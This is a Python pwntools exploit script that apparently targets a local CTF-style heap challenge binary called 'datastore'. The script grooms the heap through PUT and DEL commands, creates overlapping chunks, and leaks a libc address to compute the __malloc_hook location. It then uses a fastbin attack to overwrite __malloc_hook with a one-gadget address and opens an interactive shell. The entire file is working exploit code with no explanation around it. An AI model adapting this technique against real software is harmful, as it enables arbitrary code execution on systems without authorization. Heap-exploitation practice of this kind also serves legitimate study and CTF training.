#!/usr/bin/python
from pwn import *
def PUT(key, data):
    p.sendline("PUT")
    print p.recvuntil(":\n")
    p.sendline(key)
    print p.recvuntil(":\n")
    p.sendline(str(len(data)))
    print p.recvuntil(":\n")
    p.send(data)
    print p.recvuntil(":\n")

def DEL(key):
    p.sendline("DEL")
    print p.recvuntil(":\n")
    p.sendline(key)
    print p.recvuntil(":\n")

def GET(key, shell=False):
    p.sendline("GET")
    print p.recvuntil(":\n")
    p.sendline(key)
    print p.recvuntil(":\n")
    if not shell:
        data=p.recvuntil("PROMPT:")
        return u64(data[8:16])

if __name__=="__main__":

    p = process("./datastore")#, aslr=False)
    print p.recvuntil("command:\n")

    PUT('a', 'A'*0x420)
    PUT('b', 'B'*0x10)
    PUT('c', 'C'*0x10)
    PUT('d', 'D'*0x10)
    PUT('e', 'E'*0x40)
    PUT('f', 'F'*0x40)

    DEL('a')
    DEL('b')
    PUT('b', 'B'*0x200)
    DEL('c')
    PUT('c', 'C'*0x100)

    DEL('d')
    PUT('d', 'D'*0x100)

    PUT('g', 'G'*0x10)
    PUT('h', 'H'*0x10)
    DEL('b')
    DEL('e')
    PUT('j'*0x18, 'J'*0x200)
    PUT('k', 'K'*0x100)
    DEL('f')
    PUT('l', 'L'*0x80)
    DEL('k')
    DEL('c')
    #####

    PUT('1', '1'*0x100)
    payload = '2'*0x60 + p64(0x0) + p64(0x2240)+p64(0x0)*2
    PUT('2', payload)
    DEL('2')
    addr = GET('l')

    libc_base = addr - 0x3c3b78
    malloc_hook = libc_base + 0x3c3b10
    print 'libc base', hex(libc_base)
    print 'malloc hook', hex(malloc_hook)

    DEL('1')
    payload = '1'*0x100
    payload += p64(0x110)
    payload += p64(0x71)
    payload += p64(malloc_hook-35)
    payload += p64(0x0)
    PUT('1', payload)


    DEL('l')

    DEL('1')
    PUT('1', payload)
    PUT('3', '3'*0x60)

    onegadget = libc_base + 0x4526a
    #onegadget = libc_base + 0xef6c4
    #onegadget = libc_base + 0xf0567

    payload = '4'*19
    payload += p64(onegadget)
    payload += '4'*(0x60-len(payload))
    PUT('4', payload)

    GET('3', True)

    p.interactive()
    p.close()
